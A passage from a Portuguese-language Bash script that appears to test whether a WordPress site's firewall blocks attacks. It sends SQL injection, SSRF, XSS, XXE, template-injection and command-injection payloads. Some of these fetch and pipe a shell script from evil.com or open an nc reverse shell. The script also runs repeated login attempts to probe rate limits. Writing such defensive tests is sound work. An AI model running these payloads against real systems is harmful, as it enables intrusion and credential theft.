    test_curl "DB: CHAR() bypass" "block" -A "$UA" -Lk "${URL}?id=1' AND 1=CHAR(49)--"
    test_curl "DB: /*!MySQL comment*/" "block" -A "$UA" -Lk "${URL}?id=1'/*!50000UNION*/SELECT 1--"
}

#==============================================================================
# SSRF ATTACKS (15 testes)
#==============================================================================
test_ssrf_attacks() {
    print_section "🌐 TESTES DE SSRF - Server Side Request Forgery (15 testes)"
    
    print_subsection "Localhost e IPs Internos"
    test_curl "SSRF: http://localhost" "block" -A "$UA" -Lk "${URL}?url=http://localhost"
    test_curl "SSRF: http://127.0.0.1" "block" -A "$UA" -Lk "${URL}?url=http://127.0.0.1"
    test_curl "SSRF: http://[::1]" "block" -A "$UA" -Lk "${URL}?url=http://[::1]"
    test_curl "SSRF: http://0.0.0.0" "block" -A "$UA" -Lk "${URL}?url=http://0.0.0.0"
    test_curl "SSRF: http://192.168.1.1" "block" -A "$UA" -Lk "${URL}?url=http://192.168.1.1"
    test_curl "SSRF: http://10.0.0.1" "block" -A "$UA" -Lk "${URL}?url=http://10.0.0.1"
    
    print_subsection "Cloud Metadata"
    test_curl "SSRF: AWS metadata" "block" -A "$UA" -Lk "${URL}?url=http://169.254.169.254/latest/meta-data/"
    test_curl "SSRF: GCP metadata" "block" -A "$UA" -Lk "${URL}?url=http://metadata.google.internal/"
    test_curl "SSRF: Azure metadata" "block" -A "$UA" -Lk "${URL}?url=http://169.254.169.254/metadata/instance"
    test_curl "SSRF: DigitalOcean" "block" -A "$UA" -Lk "${URL}?url=http://169.254.169.254/metadata/v1/"
    
    print_subsection "Bypass e Protocolos"
    test_curl "SSRF: file://" "block" -A "$UA" -Lk "${URL}?url=file:///etc/passwd"
    test_curl "SSRF: gopher://" "block" -A "$UA" -Lk "${URL}?url=gopher://localhost:25/"
    test_curl "SSRF: dict://" "block" -A "$UA" -Lk "${URL}?url=dict://localhost:11211/"
    test_curl "SSRF: 127.0.0.1 decimal" "block" -A "$UA" -Lk "${URL}?url=http://2130706433"
    test_curl "SSRF: localhost hex" "block" -A "$UA" -Lk "${URL}?url=http://0x7f000001"
}

#==============================================================================
# INJECTION VULNERABILITIES - COMPREHENSIVE TESTS (160+ testes)
#==============================================================================
test_injection_vulnerabilities() {
    print_section "💉 TESTES DE INJECTION VULNERABILITIES (160+ testes)"
    
    # -------------------------------------------------------------------------
    # 1. SQL INJECTION (SQLi)
    # -------------------------------------------------------------------------
    print_subsection "1. SQL Injection (SQLi)"
    test_curl "SQLi: ' OR '1'='1" "block" -A "$UA" -Lk "${URL}?id=' OR '1'='1"
    test_curl "SQLi: ' OR 1=1--" "block" -A "$UA" -Lk "${URL}?id=' OR 1=1--"
    test_curl "SQLi: \" OR \"\"=\"" "block" -A "$UA" -Lk "${URL}?id=\" OR \"\"=\""
    test_curl "SQLi: 1' AND '1'='1" "block" -A "$UA" -Lk "${URL}?id=1' AND '1'='1"
    test_curl "SQLi: UNION SELECT" "block" -A "$UA" -Lk "${URL}?id=1 UNION SELECT 1,2,3--"
    test_curl "SQLi: UNION ALL SELECT" "block" -A "$UA" -Lk "${URL}?id=1 UNION ALL SELECT null,null,null--"
    test_curl "SQLi: ORDER BY" "block" -A "$UA" -Lk "${URL}?id=1 ORDER BY 10--"
    test_curl "SQLi: GROUP BY" "block" -A "$UA" -Lk "${URL}?id=1 GROUP BY 1--"
    test_curl "SQLi: HAVING" "block" -A "$UA" -Lk "${URL}?id=1 HAVING 1=1--"
    test_curl "SQLi: INSERT INTO" "block" -A "$UA" -Lk "${URL}?id=1'; INSERT INTO users VALUES('hacker')--"
    
    # -------------------------------------------------------------------------
    # 2. CROSS-SITE SCRIPTING (XSS)
    # -------------------------------------------------------------------------
    print_subsection "2. Cross-Site Scripting (XSS)"
    test_curl "XSS: <script>alert(1)</script>" "block" -A "$UA" -Lk "${URL}?q=<script>alert(1)</script>"
    test_curl "XSS: <img onerror>" "block" -A "$UA" -Lk "${URL}?q=<img src=x onerror=alert(1)>"
    test_curl "XSS: <svg onload>" "block" -A "$UA" -Lk "${URL}?q=<svg onload=alert(1)>"
    test_curl "XSS: <body onload>" "block" -A "$UA" -Lk "${URL}?q=<body onload=alert(1)>"
    test_curl "XSS: javascript:" "block" -A "$UA" -Lk "${URL}?url=javascript:alert(1)"
    test_curl "XSS: <iframe src>" "block" -A "$UA" -Lk "${URL}?q=<iframe src=javascript:alert(1)>"
    test_curl "XSS: <input onfocus>" "block" -A "$UA" -Lk "${URL}?q=<input onfocus=alert(1) autofocus>"
    test_curl "XSS: <a href=javascript>" "block" -A "$UA" -Lk "${URL}?q=<a href=javascript:alert(1)>click</a>"
    test_curl "XSS: <div onmouseover>" "block" -A "$UA" -Lk "${URL}?q=<div onmouseover=alert(1)>hover</div>"
    test_curl "XSS: eval()" "block" -A "$UA" -Lk "${URL}?q=<script>eval('ale'+'rt(1)')</script>"
    
    # -------------------------------------------------------------------------
    # 3. CROSS-SITE REQUEST FORGERY (CSRF) Detection
    # -------------------------------------------------------------------------
    print_subsection "3. Cross-Site Request Forgery (CSRF)"
    test_curl "CSRF: POST sem Referer" "block" -A "$UA" -Lk -X POST -d "action=delete&id=1" "$URL"
    test_curl "CSRF: POST com Referer externo" "block" -A "$UA" -Lk -X POST -e "http://evil.com" -d "action=delete&id=1" "$URL"
    test_curl "CSRF: POST sem Origin" "block" -A "$UA" -Lk -X POST -d "action=transfer&amount=1000" "$URL"
    test_curl "CSRF: POST com Origin externo" "block" -A "$UA" -Lk -X POST -H "Origin: http://evil.com" -d "action=transfer" "$URL"
    test_curl "CSRF: Forged token" "block" -A "$UA" -Lk -X POST -d "csrf_token=fake123&action=delete" "$URL"
    
    # -------------------------------------------------------------------------
    # 4. REMOTE CODE EXECUTION (RCE)
    # -------------------------------------------------------------------------
    print_subsection "4. Remote Code Execution (RCE)"
    test_curl "RCE: PHP system()" "block" -A "$UA" -Lk "${URL}?cmd=<?php system('id'); ?>"
    test_curl "RCE: PHP exec()" "block" -A "$UA" -Lk "${URL}?cmd=<?php exec('whoami'); ?>"
    test_curl "RCE: PHP passthru()" "block" -A "$UA" -Lk "${URL}?cmd=<?php passthru('cat /etc/passwd'); ?>"
    test_curl "RCE: PHP shell_exec()" "block" -A "$UA" -Lk "${URL}?cmd=<?php shell_exec('ls -la'); ?>"
    test_curl "RCE: PHP eval()" "block" -A "$UA" -Lk "${URL}?code=<?php eval(\$_GET['c']); ?>"
    test_curl "RCE: PHP assert()" "block" -A "$UA" -Lk "${URL}?code=<?php assert('system(\"id\")'); ?>"
    test_curl "RCE: PHP backticks" "block" -A "$UA" -Lk "${URL}?cmd=<?php echo \`id\`; ?>"
    test_curl "RCE: PHP popen()" "block" -A "$UA" -Lk "${URL}?cmd=<?php popen('id','r'); ?>"
    test_curl "RCE: PHP proc_open()" "block" -A "$UA" -Lk "${URL}?cmd=<?php proc_open('id',array(),''); ?>"
    test_curl "RCE: Python os.system" "block" -A "$UA" -Lk "${URL}?cmd=import os;os.system('id')"
    
    # -------------------------------------------------------------------------
    # 5. COMMAND INJECTION
    # -------------------------------------------------------------------------
    print_subsection "5. Command Injection"
    test_curl "CMDi: ; id" "block" -A "$UA" -Lk "${URL}?cmd=;id"
    test_curl "CMDi: | id" "block" -A "$UA" -Lk "${URL}?cmd=|id"
    test_curl "CMDi: || id" "block" -A "$UA" -Lk "${URL}?cmd=||id"
    test_curl "CMDi: && id" "block" -A "$UA" -Lk "${URL}?cmd=\`id\`"
    test_curl "CMDi: \$(id)" "block" -A "$UA" -Lk "${URL}?cmd=\$(id)"
    test_curl "CMDi: \`id\`" "block" -A "$UA" -Lk "${URL}?cmd=\`id\`"
    test_curl "CMDi: newline" "block" -A "$UA" -Lk "${URL}?cmd=test%0aid"
    test_curl "CMDi: carriage return" "block" -A "$UA" -Lk "${URL}?cmd=test%0did"
    test_curl "CMDi: cat /etc/passwd" "block" -A "$UA" -Lk "${URL}?file=;cat /etc/passwd"
    test_curl "CMDi: curl payload" "block" -A "$UA" -Lk "${URL}?url=;curl http://evil.com/shell.sh|sh"
    
    # -------------------------------------------------------------------------
    # 6. XML INJECTION
    # -------------------------------------------------------------------------
    print_subsection "6. XML Injection"
    test_curl "XMLi: Basic entity" "block" -A "$UA" -Lk -H "Content-Type: application/xml" -d '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe "test">]><foo>&xxe;</foo>' "$URL"
    test_curl "XMLi: File disclosure" "block" -A "$UA" -Lk -H "Content-Type: application/xml" -d '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>' "$URL"
    test_curl "XMLi: SSRF via DTD" "block" -A "$UA" -Lk -H "Content-Type: application/xml" -d '<?xml version="1.0"?><!DOCTYPE foo SYSTEM "http://evil.com/xxe.dtd"><foo></foo>' "$URL"
    test_curl "XMLi: Parameter entity" "block" -A "$UA" -Lk -H "Content-Type: application/xml" -d '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "file:///etc/passwd">%xxe;]><foo></foo>' "$URL"
    test_curl "XMLi: Billion laughs" "block" -A "$UA" -Lk -H "Content-Type: application/xml" -d '<?xml version="1.0"?><!DOCTYPE lolz [<!ENTITY lol "lol"><!ENTITY lol2 "&lol;&lol;&lol;">]><lolz>&lol2;</lolz>' "$URL"
    test_curl "XMLi: PHP expect" "block" -A "$UA" -Lk -H "Content-Type: application/xml" -d '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "expect://id">]><foo>&xxe;</foo>' "$URL"

    # -------------------------------------------------------------------------
    # 7. XPATH INJECTION
    # -------------------------------------------------------------------------
    print_subsection "7. XPath Injection"
    test_curl "XPath: ' or '1'='1" "block" -A "$UA" -Lk "${URL}?user=' or '1'='1"
    test_curl "XPath: ' or ''='" "block" -A "$UA" -Lk "${URL}?user=' or ''='"
    test_curl "XPath: '] | //*['" "block" -A "$UA" -Lk "${URL}?user='] | //*['"
    test_curl "XPath: //*" "block" -A "$UA" -Lk "${URL}?xpath=//*"
    test_curl "XPath: //user[1]" "block" -A "$UA" -Lk "${URL}?xpath=//user[1]"
    test_curl "XPath: count(//*)" "block" -A "$UA" -Lk "${URL}?xpath=count(//*)"
    test_curl "XPath: string-length" "block" -A "$UA" -Lk "${URL}?xpath=string-length(//password)"
    test_curl "XPath: substring" "block" -A "$UA" -Lk "${URL}?xpath=substring(//password,1,1)"
    
    # -------------------------------------------------------------------------
    # 8. HTML INJECTION
    # -------------------------------------------------------------------------
    print_subsection "8. HTML Injection"
    test_curl "HTMLi: <h1>injected</h1>" "block" -A "$UA" -Lk "${URL}?name=<h1>injected</h1>"
    test_curl "HTMLi: <form action>" "block" -A "$UA" -Lk "${URL}?name=<form action=http://evil.com><input name=password></form>"
    test_curl "HTMLi: <meta redirect>" "block" -A "$UA" -Lk "${URL}?name=<meta http-equiv=refresh content=0;url=http://evil.com>"
    test_curl "HTMLi: <base href>" "block" -A "$UA" -Lk "${URL}?name=<base href=http://evil.com/>"
    test_curl "HTMLi: <link rel>" "block" -A "$UA" -Lk "${URL}?name=<link rel=stylesheet href=http://evil.com/evil.css>"
    test_curl "HTMLi: <style>" "block" -A "$UA" -Lk "${URL}?name=<style>body{background:url(http://evil.com)}</style>"
    test_curl "HTMLi: <marquee>" "block" -A "$UA" -Lk "${URL}?name=<marquee onstart=alert(1)>test</marquee>"
    test_curl "HTMLi: <object data>" "block" -A "$UA" -Lk "${URL}?name=<object data=javascript:alert(1)>"
    
    # -------------------------------------------------------------------------
    # 9. SERVER-SIDE INCLUDES (SSI) INJECTION
    # -------------------------------------------------------------------------
    print_subsection "9. Server-Side Includes (SSI) Injection"
    test_curl "SSI: <!--#exec cmd" "block" -A "$UA" -Lk "${URL}?page=<!--#exec cmd=\"id\"-->"
    test_curl "SSI: <!--#include" "block" -A "$UA" -Lk "${URL}?page=<!--#include virtual=\"/etc/passwd\"-->"
    test_curl "SSI: <!--#echo var" "block" -A "$UA" -Lk "${URL}?page=<!--#echo var=\"DOCUMENT_ROOT\"-->"
    test_curl "SSI: <!--#config" "block" -A "$UA" -Lk "${URL}?page=<!--#config timefmt=\"%D\"-->"
    test_curl "SSI: <!--#set var" "block" -A "$UA" -Lk "${URL}?page=<!--#set var=\"x\" value=\"test\"-->"
    test_curl "SSI: <!--#printenv" "block" -A "$UA" -Lk "${URL}?page=<!--#printenv-->"
    test_curl "SSI: <!--#fsize" "block" -A "$UA" -Lk "${URL}?page=<!--#fsize file=\"/etc/passwd\"-->"
    
    # -------------------------------------------------------------------------
    # 10. OS COMMAND INJECTION (Extended)
    # -------------------------------------------------------------------------
    print_subsection "10. OS Command Injection (Extended)"
    test_curl "OSi: /bin/bash -c" "block" -A "$UA" -Lk "${URL}?cmd=/bin/bash -c 'id'"
    test_curl "OSi: /bin/sh -c" "block" -A "$UA" -Lk "${URL}?cmd=/bin/sh -c 'whoami'"
    test_curl "OSi: nc -e" "block" -A "$UA" -Lk "${URL}?cmd=nc -e /bin/sh evil.com 4444"
    test_curl "OSi: wget | sh" "block" -A "$UA" -Lk "${URL}?cmd=wget http://evil.com/shell.sh -O- | sh"
    test_curl "OSi: curl | bash" "block" -A "$UA" -Lk "${URL}?cmd=curl http://evil.com/shell.sh | bash"
    test_curl "OSi: python reverse" "block" -A "$UA" -Lk "${URL}?cmd=python -c 'import socket,subprocess,os'"
    test_curl "OSi: perl reverse" "block" -A "$UA" -Lk "${URL}?cmd=perl -e 'use Socket'"
    test_curl "OSi: ruby reverse" "block" -A "$UA" -Lk "${URL}?cmd=ruby -rsocket -e'f=TCPSocket'"
    test_curl "OSi: php reverse" "block" -A "$UA" -Lk "${URL}?cmd=php -r '\$sock=fsockopen'"
    test_curl "OSi: base64 decode" "block" -A "$UA" -Lk "${URL}?cmd=echo aWQ= | base64 -d | sh"
    
    # -------------------------------------------------------------------------
    # 11. BLIND SQL INJECTION
    # -------------------------------------------------------------------------
    print_subsection "11. Blind SQL Injection"
    test_curl "BlindSQLi: SLEEP(5)" "block" -A "$UA" -Lk "${URL}?id=1' AND SLEEP(5)--"
    test_curl "BlindSQLi: BENCHMARK" "block" -A "$UA" -Lk "${URL}?id=1' AND BENCHMARK(10000000,MD5('test'))--"
    test_curl "BlindSQLi: WAITFOR DELAY" "block" -A "$UA" -Lk "${URL}?id=1'; WAITFOR DELAY '0:0:5'--"
    test_curl "BlindSQLi: pg_sleep" "block" -A "$UA" -Lk "${URL}?id=1'; SELECT pg_sleep(5)--"
    test_curl "BlindSQLi: IF()" "block" -A "$UA" -Lk "${URL}?id=1' AND IF(1=1,SLEEP(5),0)--"
    test_curl "BlindSQLi: CASE WHEN" "block" -A "$UA" -Lk "${URL}?id=1' AND CASE WHEN (1=1) THEN SLEEP(5) ELSE 0 END--"
    test_curl "BlindSQLi: AND 1=1" "block" -A "$UA" -Lk "${URL}?id=1' AND 1=1--"
    test_curl "BlindSQLi: AND 1=2" "block" -A "$UA" -Lk "${URL}?id=1' AND 1=2--"
    test_curl "BlindSQLi: substring" "block" -A "$UA" -Lk "${URL}?id=1' AND SUBSTRING(@@version,1,1)='5'--"
    test_curl "BlindSQLi: ASCII" "block" -A "$UA" -Lk "${URL}?id=1' AND ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1))>64--"
    
    # -------------------------------------------------------------------------
    # 12. SERVER-SIDE TEMPLATE INJECTION (SSTI)
    # -------------------------------------------------------------------------
    print_subsection "12. Server-Side Template Injection (SSTI)"
    test_curl "SSTI: {{7*7}}" "block" -A "$UA" -Lk "${URL}?name={{7*7}}"
    test_curl "SSTI: {{config}}" "block" -A "$UA" -Lk "${URL}?name={{config}}"
    test_curl "SSTI: {{self}}" "block" -A "$UA" -Lk "${URL}?name={{self.__class__}}"
    test_curl "SSTI: Jinja2 RCE" "block" -A "$UA" -Lk "${URL}?name={{''.__class__.__mro__[2].__subclasses__()}}"
    test_curl "SSTI: Twig" "block" -A "$UA" -Lk "${URL}?name={{_self.env.registerUndefinedFilterCallback('exec')}}"
    test_curl "SSTI: FreeMarker" "block" -A "$UA" -Lk "${URL}?name=<#assign ex=\"freemarker.template.utility.Execute\"?new()>\${ex(\"id\")}"
    test_curl "SSTI: Velocity" "block" -A "$UA" -Lk "${URL}?name=#set(\$str=\$class.inspect(\"java.lang.String\"))"
    test_curl "SSTI: Smarty" "block" -A "$UA" -Lk "${URL}?name={php}echo system('id');{/php}"
    test_curl "SSTI: Mako" "block" -A "$UA" -Lk "${URL}?name=<%import os;os.popen('id').read()%>"
    test_curl "SSTI: ERB" "block" -A "$UA" -Lk "${URL}?name=<%=system('id')%>"
    
    # -------------------------------------------------------------------------
    # 13. CRLF INJECTION
    # -------------------------------------------------------------------------
    print_subsection "13. CRLF Injection"
    test_curl "CRLF: %0d%0a" "block" -A "$UA" -Lk "${URL}?url=http://example.com%0d%0aSet-Cookie:hacked=true"
    test_curl "CRLF: %0a" "block" -A "$UA" -Lk "${URL}?url=http://example.com%0aX-Injected:true"
    test_curl "CRLF: %0d" "block" -A "$UA" -Lk "${URL}?url=http://example.com%0dX-Injected:true"
    test_curl "CRLF: \\r\\n" "block" -A "$UA" -Lk -H $'X-Custom: test\r\nX-Injected: true' "$URL"
    test_curl "CRLF: Header Set-Cookie" "block" -A "$UA" -Lk -H $'X-Foo: bar\r\nSet-Cookie: admin=true' "$URL"
    test_curl "CRLF: Header Location" "block" -A "$UA" -Lk -H $'X-Foo: bar\r\nLocation: http://evil.com' "$URL"
    test_curl "CRLF: Double CRLF" "block" -A "$UA" -Lk "${URL}?url=http://example.com%0d%0a%0d%0a<html>injected</html>"
    test_curl "CRLF: Unicode" "block" -A "$UA" -Lk "${URL}?url=http://example.com%E5%98%8D%E5%98%8ASet-Cookie:hacked=true"
    
    # -------------------------------------------------------------------------
    # 14. NOSQL INJECTION
    # -------------------------------------------------------------------------
    print_subsection "14. NoSQL Injection"
    test_curl "NoSQLi: \$ne" "block" -A "$UA" -Lk "${URL}?user[\$ne]=admin"
    test_curl "NoSQLi: \$gt" "block" -A "$UA" -Lk "${URL}?user[\$gt]="
    test_curl "NoSQLi: \$regex" "block" -A "$UA" -Lk "${URL}?user[\$regex]=.*"
    test_curl "NoSQLi: \$where" "block" -A "$UA" -Lk "${URL}?user[\$where]=1"
    test_curl "NoSQLi: \$exists" "block" -A "$UA" -Lk "${URL}?password[\$exists]=true"
    test_curl "NoSQLi: JSON \$ne" "block" -A "$UA" -Lk -H "Content-Type: application/json" -d '{"user":{"$ne":""},"pass":{"$ne":""}}' "$URL"
    test_curl "NoSQLi: JSON \$gt" "block" -A "$UA" -Lk -H "Content-Type: application/json" -d '{"user":"admin","pass":{"$gt":""}}' "$URL"
    test_curl "NoSQLi: JSON \$regex" "block" -A "$UA" -Lk -H "Content-Type: application/json" -d '{"user":{"$regex":"^admin"}}' "$URL"
    test_curl "NoSQLi: \$or bypass" "block" -A "$UA" -Lk -H "Content-Type: application/json" -d '{"$or":[{"user":"admin"},{"user":"guest"}]}' "$URL"
    test_curl "NoSQLi: \$nin" "block" -A "$UA" -Lk "${URL}?role[\$nin][]=user"
    
    # -------------------------------------------------------------------------
    # 15. HQL INJECTION (Hibernate Query Language)
    # -------------------------------------------------------------------------
    print_subsection "15. HQL Injection"
    test_curl "HQL: OR 1=1" "block" -A "$UA" -Lk "${URL}?name=' OR '1'='1"
    test_curl "HQL: UNION" "block" -A "$UA" -Lk "${URL}?name=' UNION SELECT password FROM User--"
    test_curl "HQL: FROM User" "block" -A "$UA" -Lk "${URL}?query=FROM User WHERE id=1"
    test_curl "HQL: SELECT *" "block" -A "$UA" -Lk "${URL}?query=SELECT * FROM User"
    test_curl "HQL: DELETE" "block" -A "$UA" -Lk "${URL}?query=DELETE FROM User WHERE id=1"
    test_curl "HQL: UPDATE" "block" -A "$UA" -Lk "${URL}?query=UPDATE User SET admin=true"
    test_curl "HQL: ORDER BY sleep" "block" -A "$UA" -Lk "${URL}?order=' AND SLEEP(5)--"
    test_curl "HQL: subquery" "block" -A "$UA" -Lk "${URL}?id=(SELECT id FROM User WHERE admin=true)"
}

#==============================================================================
# RATE LIMITING TESTS - Brute Force Protection (30+ testes)
#==============================================================================
test_rate_limiting() {
    print_section "⏱️ TESTES DE RATE LIMITING (Proteção Brute-Force)"
    
    local rate_limit_detected=0
    local request_count=20
    
    # -------------------------------------------------------------------------
    # WP-LOGIN.PHP Rate Limiting
    # -------------------------------------------------------------------------
    print_subsection "WordPress Login (wp-login.php)"
    
    echo -e "  ${YELLOW}ℹ️  Enviando $request_count requisições rápidas para wp-login.php...${NC}"
    
    local blocked_count=0
    local success_count=0
    
    for i in $(seq 1 $request_count); do
        local response
        response=$(curl -s -o /dev/null -w "%{http_code}" -A "$UA" -Lk \
            -X POST \
            -d "log=admin&pwd=wrongpassword$i&wp-submit=Log+In" \
            --connect-timeout 5 \
            --max-time 10 \
            "${URL}/wp-login.php" 2>/dev/null)
        
        if [[ "$response" == "429" ]] || [[ "$response" == "403" ]] || [[ "$response" == "503" ]]; then
            blocked_count=$((blocked_count + 1))
            if [[ $blocked_count -eq 1 ]]; then
                echo -e "  ${GREEN}[✓]${NC} Rate limit detectado na requisição #$i (HTTP $response)"
                rate_limit_detected=1
            fi
        else
            success_count=$((success_count + 1))
        fi
    done
    
    if [[ $blocked_count -gt 0 ]]; then
        PASSED_TESTS=$((PASSED_TESTS + 1))
        echo -e "  ${GREEN}[✓] PASS:${NC} Rate limiting ativo - $blocked_count de $request_count requisições bloqueadas"
    else
        FAILED_TESTS=$((FAILED_TESTS + 1))
        echo -e "  ${RED}[✗] FAIL:${NC} Sem rate limiting - todas as $request_count requisições passaram!"
    fi
    TOTAL_TESTS=$((TOTAL_TESTS + 1))
    
    # -------------------------------------------------------------------------
    # XMLRPC Rate Limiting
    # -------------------------------------------------------------------------
    print_subsection "XMLRPC Multicall Attack"
    
    echo -e "  ${YELLOW}ℹ️  Testando rate limiting em xmlrpc.php...${NC}"
    
    blocked_count=0
    for i in $(seq 1 10); do
        local response
        response=$(curl -s -o /dev/null -w "%{http_code}" -A "$UA" -Lk \
            -X POST \
            -H "Content-Type: application/xml" \
            -d '<?xml version="1.0"?><methodCall><methodName>system.multicall</methodName><params><param><value><array><data><value><struct><member><name>methodName</name><value><string>wp.getUsersBlogs</string></value></member><member><name>params</name><value><array><data><value><string>admin</value></string><value><string>password'$i'</string></value></data></array></value></member></struct></value></data></array></value></param></params></methodCall>' \
            --connect-timeout 5 \
            --max-time 10 \
            "${URL}/xmlrpc.php" 2>/dev/null)
        
        if [[ "$response" == "429" ]] || [[ "$response" == "403" ]] || [[ "$response" == "405" ]] || [[ "$response" == "503" ]]; then
            blocked_count=$((blocked_count + 1))
        fi
    done
    
    if [[ $blocked_count -gt 0 ]]; then
        PASSED_TESTS=$((PASSED_TESTS + 1))
        echo -e "  ${GREEN}[✓] PASS:${NC} XMLRPC bloqueado ou rate-limited ($blocked_count/10)"
    else
        FAILED_TESTS=$((FAILED_TESTS + 1))
        echo -e "  ${RED}[✗] FAIL:${NC} XMLRPC sem proteção - vulnerável a brute-force!"
    fi
    TOTAL_TESTS=$((TOTAL_TESTS + 1))
    
    # -------------------------------------------------------------------------
    # Admin-Ajax Rate Limiting
    # -------------------------------------------------------------------------
    print_subsection "Admin-Ajax Endpoint"
    
    echo -e "  ${YELLOW}ℹ️  Testando rate limiting em admin-ajax.php...${NC}"
    
    blocked_count=0
    for i in $(seq 1 15); do
        local response
        response=$(curl -s -o /dev/null -w "%{http_code}" -A "$UA" -Lk \
            -X POST \
            -d "action=heartbeat" \
            --connect-timeout 5 \
            --max-time 10 \
            "${URL}/wp-admin/admin-ajax.php" 2>/dev/null)
        
        if [[ "$response" == "429" ]] || [[ "$response" == "403" ]] || [[ "$response" == "503" ]]; then
            blocked_count=$((blocked_count + 1))
        fi
    done
    
    if [[ $blocked_count -gt 0 ]]; then
        PASSED_TESTS=$((PASSED_TESTS + 1))
        echo -e "  ${GREEN}[✓] PASS:${NC} Admin-Ajax rate-limited ($blocked_count/15)"
    else
        echo -e "  ${YELLOW}[?] WARN:${NC} Admin-Ajax sem rate limiting detectado"
    fi
    TOTAL_TESTS=$((TOTAL_TESTS + 1))
    
    # -------------------------------------------------------------------------
    # REST API Rate Limiting
    # -------------------------------------------------------------------------
    print_subsection "REST API Endpoints"
    
    echo -e "  ${YELLOW}ℹ️  Testando rate limiting na REST API...${NC}"
    
    blocked_count=0
    for i in $(seq 1 15); do
        local response
        response=$(curl -s -o /dev/null -w "%{http_code}" -A "$UA" -Lk \
            --connect-timeout 5 \
            --max-time 10 \
            "${URL}/wp-json/wp/v2/users" 2>/dev/null)
        
        if [[ "$response" == "429" ]] || [[ "$response" == "403" ]] || [[ "$response" == "503" ]]; then
            blocked_count=$((blocked_count + 1))
        fi
    done
    
    if [[ $blocked_count -gt 0 ]]; then
        PASSED_TESTS=$((PASSED_TESTS + 1))
        echo -e "  ${GREEN}[✓] PASS:${NC} REST API rate-limited ($blocked_count/15)"
    else
        FAILED_TESTS=$((FAILED_TESTS + 1))
        echo -e "  ${RED}[✗] FAIL:${NC} REST API sem rate limiting - user enumeration possível!"
    fi
    TOTAL_TESTS=$((TOTAL_TESTS + 1))
    
    # -------------------------------------------------------------------------
    # TESTES INDIVIDUAIS DE ENDPOINTS SENSÍVEIS
    # -------------------------------------------------------------------------
    print_subsection "Endpoints Sensíveis (testes individuais)"
    
    # Testar se wp-login.php aceita requisições POST
    test_curl "wp-login.php POST" "block" -A "$UA" -Lk -X POST -d "log=admin&pwd=test" "${URL}/wp-login.php"
    
    # Testar recuperação de senha
    test_curl "wp-login.php lostpassword" "block" -A "$UA" -Lk "${URL}/wp-login.php?action=lostpassword"
    
    # Testar registro (se habilitado, pode ser explorado)
    test_curl "wp-login.php register" "block" -A "$UA" -Lk "${URL}/wp-login.php?action=register"
    
    # Testar confirmação de ação
    test_curl "wp-login.php postpass" "block" -A "$UA" -Lk -X POST "${URL}/wp-login.php?action=postpass"
    
    # Testar xmlrpc
    test_curl "xmlrpc.php GET" "block" -A "$UA" -Lk "${URL}/xmlrpc.php"
    test_curl "xmlrpc.php POST" "block" -A "$UA" -Lk -X POST "${URL}/xmlrpc.php"
    
    # Testar author enumeration
    test_curl "Author enum ?author=1" "block" -A "$UA" -Lk "${URL}/?author=1"
    test_curl "Author enum ?author=2" "block" -A "$UA" -Lk "${URL}/?author=2"
    
    # Testar user enumeration via REST
    test_curl "REST user enum" "block" -A "$UA" -Lk "${URL}/wp-json/wp/v2/users"
    test_curl "REST user enum specific" "block" -A "$UA" -Lk "${URL}/wp-json/wp/v2/users/1"
    
    # -------------------------------------------------------------------------
    # CONCURRENT REQUESTS TEST
    # -------------------------------------------------------------------------
    print_subsection "Teste de Requisições Concorrentes"
    
    echo -e "  ${YELLOW}ℹ️  Enviando 10 requisições simultâneas...${NC}"
    
    local concurrent_blocked=0
    
    # Usar xargs ou background jobs para requisições paralelas
    for i in $(seq 1 10); do
        curl -s -o /dev/null -w "%{http_code}\n" -A "$UA" -Lk \
            -X POST \
            -d "log=admin&pwd=concurrent$i" \
            --connect-timeout 5 \
            --max-time 10 \
            "${URL}/wp-login.php" 2>/dev/null &
    done
    wait
    
    # Verificar última resposta
    local final_response
    final_response=$(curl -s -o /dev/null -w "%{http_code}" -A "$UA" -Lk \
        -X POST \
        -d "log=admin&pwd=finaltest" \
        --connect-timeout 5 \
        --max-time 10 \
        "${URL}/wp-login.php" 2>/dev/null)
    
    if [[ "$final_response" == "429" ]] || [[ "$final_response" == "403" ]] || [[ "$final_response" == "503" ]]; then
        PASSED_TESTS=$((PASSED_TESTS + 1))
        echo -e "  ${GREEN}[✓] PASS:${NC} Servidor bloqueou após requisições concorrentes (HTTP $final_response)"
    else
        FAILED_TESTS=$((FAILED_TESTS + 1))
        echo -e "  ${RED}[✗] FAIL:${NC} Servidor não bloqueou requisições concorrentes (HTTP $final_response)"
    fi
    TOTAL_TESTS=$((TOTAL_TESTS + 1))
    
    # -------------------------------------------------------------------------
    # SUMMARY
    # -------------------------------------------------------------------------
    echo ""
    if [[ $rate_limit_detected -eq 1 ]]; then
        echo -e "  ${GREEN}✅ Rate limiting detectado no servidor${NC}"
    else
        echo -e "  ${RED}⚠️  Rate limiting NÃO detectado - servidor pode estar vulnerável a brute-force!${NC}"
    fi
}

#==============================================================================
# PATH/URL BYPASS TECHNIQUES (40+ testes)
#==============================================================================
test_path_bypass() {
    print_section "🔓 TESTES DE PATH/URL BYPASS (40+ testes)"
    
    print_subsection "Null Byte Injection"
    test_curl "Null Byte: admin.php%00.html" "block" -A "$UA" -Lk --path-as-is "${URL}/admin.php%00.html"
    test_curl "Null Byte: admin%00" "block" -A "$UA" -Lk --path-as-is "${URL}/admin%00"
    test_curl "Null Byte: admin.php%00.jpg" "block" -A "$UA" -Lk --path-as-is "${URL}/admin.php%00.jpg"
    test_curl "Null Byte: config.php%00.txt" "block" -A "$UA" -Lk --path-as-is "${URL}/config.php%00.txt"
    test_curl "Null Byte: /etc/passwd%00" "block" -A "$UA" -Lk --path-as-is "${URL}/../../../etc/passwd%00"
    
    print_subsection "HTTP Version Downgrade"
    test_curl "HTTP/1.0: /admin" "block" -A "$UA" -Lk --http1.0 "${URL}/admin"
    test_curl "HTTP/1.0: /wp-admin" "block" -A "$UA" -Lk --http1.0 "${URL}/wp-admin"
    test_curl "HTTP/1.0: /phpmyadmin" "block" -A "$UA" -Lk --http1.0 "${URL}/phpmyadmin"
    
    print_subsection "Parameter Tampering"
    test_curl "Param: /admin?unused_param=1" "block" -A "$UA" -Lk "${URL}/admin?unused_param=1"
